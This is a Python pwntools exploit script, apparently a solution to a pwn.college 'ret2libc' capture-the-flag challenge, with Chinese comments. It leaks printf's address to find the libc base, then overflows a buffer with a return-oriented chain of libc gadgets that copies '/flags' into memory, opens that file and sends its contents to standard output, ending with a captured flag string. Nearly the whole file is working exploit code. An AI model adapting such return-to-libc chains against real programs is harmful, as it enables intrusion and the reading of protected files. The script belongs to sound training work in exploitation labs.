#!/usr/bin/python

from pwn import *

context(arch="amd64", os="linux")

libc_base = 0x00

# gadgets
buf_offset = 0x1ec780 # .data 0x00007f21c5598780
slash_str_offset = 0x0c10 # "/\x00\x00\x00\x00\x00"
flag_str_offset = 0x1b1de0 # "flags"

pop_rdi_offset = 0x23b6a # pop rdi; ret
pop_rsi_offset = 0x2601f # pop rsi; ret
pop_rdx_offset = 0x142c92 # pop rdx; ret
ret_offset = 0x23b6b # ret

printf_offset = 0x61c90
puts_offset = 0x84420
open_offset = 0x10dce0
read_offset = 0x10dfc0
write_offset = 0x10e060
memcpy_offset = 0xbbad0
sendfile_offset = 0x112fa0


sh = process("/challenge/ret2libc_1")
print("pidof ret2libc_1:", proc.pidof(sh)[0])
# pwnlib.gdb.attach(proc.pidof(sh)[0])
sh.interactive()
# sh.sendlineafter(b"Choice >>", b'5')
sh.sendline(b'5')
lines = sh.recvlines(numlines=3)
print(lines[1].decode())
# 计算libc加载地址
libc_base = int(lines[1].decode().split(' ')[2], 16) - printf_offset
print("libc base addr:", hex(libc_base))

payload = cyclic(0x30)  # 填满缓冲区
payload += cyclic(0x8)  # saved_rbp

payload += p64(pop_rdx_offset+libc_base)
payload += p64(0x4) # rdx=4

payload += p64(pop_rsi_offset+libc_base)
payload += p64(slash_str_offset+libc_base) # rsi="/\x00\x00\x00\x00\x00"

payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_offset+libc_base) # rdi=buf

payload += p64(memcpy_offset+libc_base) # memcpy(buf, "/\x00\x00\x00\x00\x00", 4)


# payload += p64(pop_rdx_offset+libc_base)
# payload += p64(0x4) # rdx=4

payload += p64(pop_rsi_offset+libc_base)
payload += p64(flag_str_offset+libc_base) # rsi="flags"

payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_offset+libc_base+1) # rdi=buf+1

payload += p64(memcpy_offset+libc_base) # memcpy(buf+1, "flags", 4)


payload += p64(pop_rsi_offset+libc_base)
payload += p64(0)   # rsi=0

payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_offset+libc_base)    # rdi=buf

payload += p64(open_offset+libc_base)   # open('/flag', 0)


# payload += p64(pop_rdx_offset+libc_base)
# payload += p64(0x100) # rdx=0x100

# payload += p64(pop_rsi_offset+libc_base)
# payload += p64(buf_offset+libc_base) # rsi=buf

# payload += p64(pop_rdi_offset+libc_base)
# payload += p64(3) # rdi=3

# payload += p64(read_offset+libc_base) # read(3, buf, 0x100)


payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_offset+libc_base) # rdi = buf

payload += p64(puts_offset+libc_base) # puts(buf)


# payload += p64(pop_rdx_offset+libc_base)
# payload += p64(0) # rdx=0

payload += p64(pop_rsi_offset+libc_base)
payload += p64(3) # rsi=3

payload += p64(pop_rdi_offset+libc_base)
payload += p64(1) # rdi=1

payload += p64(sendfile_offset+libc_base) # sendfile(1, 3, ..., ...)

# print(hex(len(payload)))
# exit()
sh.sendlineafter(b"Choice >>", b'3')
sh.sendafter(b"Input your message:", payload)
sh.interactive()

# pwn.college{UhyrnFewUqruUQ8b39RJH9ZC64Z.QX5IDLyEzW}
